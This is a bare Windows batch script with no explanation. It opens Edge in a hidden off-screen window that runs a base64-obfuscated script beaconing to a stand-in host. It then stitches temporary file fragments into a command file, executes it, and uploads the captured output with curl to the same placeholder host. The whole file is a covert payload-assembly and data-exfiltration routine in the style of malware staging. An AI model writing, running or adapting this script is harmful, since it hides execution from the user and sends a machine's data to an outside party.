@echo off
start "" msedge.exe --window-size=1,1 --window-position=10000,10000 "data:text/html;base64,PHNjcmlwdD5mZXRjaCgnaHR0cHM6Ly9leGFtcGxlLmludmFsaWQvc3RhdHVzJykudGhlbihyPT5yLnRleHQoKSk7PC9zY3JpcHQ+"
copy /b "%TEMP%\*.part" "%TEMP%\local.cmd"
cmd /c "%TEMP%\local.cmd" > "%TEMP%\output.txt" 2>&1
curl --data-binary @%TEMP%\output.txt https://example.invalid/report
